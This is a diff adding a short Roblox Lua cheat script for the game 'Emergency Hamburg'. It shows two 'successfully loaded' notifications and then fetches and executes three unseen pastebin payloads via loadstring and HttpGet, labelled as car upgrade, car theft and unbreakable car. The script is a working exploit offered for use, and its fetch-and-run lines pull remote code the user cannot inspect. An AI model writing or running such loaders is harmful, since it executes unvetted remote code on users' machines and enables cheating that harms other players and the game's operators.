@@ -1,0 +1,19 @@
+--ℂ𝕣𝕖𝕕𝕚𝕥𝕤 𝕓𝕪 𝕞𝕖 (𝕂𝕚𝕥𝕒𝕪𝕦𝕞𝕒𝕤𝕙𝕦)--
+local StarterGui = game:GetService("StarterGui")
+ 
+StarterGui:SetCore("SendNotification",{
+    Title = "Emergency Hamburg Script",
+    Text = "Emergency Hamburg Script is succesfully loaded",
+    Duration = 12;
+})
+ 
+task.wait(3)
+StarterGui:SetCore("SendNotification",{
+    Title = "Credits to Kitayumashu",
+    Text = "Emergency Hamburg Script is succesfully loaded",
+    Duration = 12;
+})
+ 
+loadstring(game:HttpGet("https://pastebin.com/raw/k6NH2yEB"))() --Upgraded car
+loadstring(game:HttpGet("https://pastebin.com/raw/HVvmbXmC"))() --Carsteal
+loadstring(game:HttpGet("https://pastebin.com/raw/1znbyDQ7"))() --Unbreakable car
